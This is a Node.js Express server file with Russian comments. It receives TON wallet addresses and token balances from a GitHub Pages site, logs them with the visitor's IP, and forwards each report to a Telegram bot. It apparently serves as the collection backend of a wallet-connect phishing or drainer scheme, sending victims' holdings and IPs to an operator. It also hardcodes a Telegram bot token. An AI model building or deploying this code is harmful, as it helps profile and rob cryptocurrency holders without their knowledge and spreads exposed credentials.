// Этот файл можно использовать для создания Node.js сервера, который будет обрабатывать данные и отправлять их в Telegram

const express = require("express")
const cors = require("cors")
const axios = require("axios")
const bodyParser = require("body-parser")
const fs = require("fs")

const app = express()
const PORT = process.env.PORT || 3000

// Настройка CORS для разрешения запросов только с вашего домена
app.use(
  cors({
    origin: "https://heronwaterwow.github.io",
  }),
)

app.use(bodyParser.json())

// Обработчик POST запросов с данными кошелька
app.post("/api/ton-wallet-data", async (req, res) => {
  try {
    const { address, tokens, timestamp } = req.body

    if (!address || !tokens) {
      return res.status(400).json({ success: false, error: "Отсутствуют необходимые данные" })
    }

    // Логирование данных (опционально)
    const logData = {
      timestamp: timestamp || new Date().toISOString(),
      address,
      tokens,
      ip: req.ip,
    }

    fs.appendFileSync("ton_wallet_log.json", JSON.stringify(logData) + "\n")

    // Формирование сообщения для Telegram
    let message = `🔔 *Новое подключение кошелька TON*\n\n`
    message += `📝 *Адрес кошелька:* \`${address}\`\n\n`
    message += `💰 *Информация о токенах:*\n`

    tokens.forEach((token) => {
      message += `- *${token.name}* (${token.symbol}): ${token.balance}\n`
    })

    // Добавление информации о времени и IP
    message += `\n⏰ *Время подключения:* ${new Date().toLocaleString()}`
    message += `\n🌐 *IP адрес:* ${req.ip}`

    // Отправка сообщения в Telegram
    const telegramBotToken = "7534217100:AAGxLkFH_r8NzHSD-kXnZhs6rrSZjES9IUQ"
    const chatId = "5555555555" // Замените на ваш chat_id

    const telegramResponse = await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    })

    if (telegramResponse.data.ok) {
      return res.json({ success: true, message: "Данные успешно отправлены в Telegram" })
    } else {
      return res.status(500).json({ success: false, error: "Ошибка при отправке сообщения в Telegram" })
    }
  } catch (error) {
    console.error("Ошибка при обработке запроса:", error)
    return res.status(500).json({ success: false, error: "Внутренняя ошибка сервера" })
  }
})

// Запуск сервера
app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`)
})
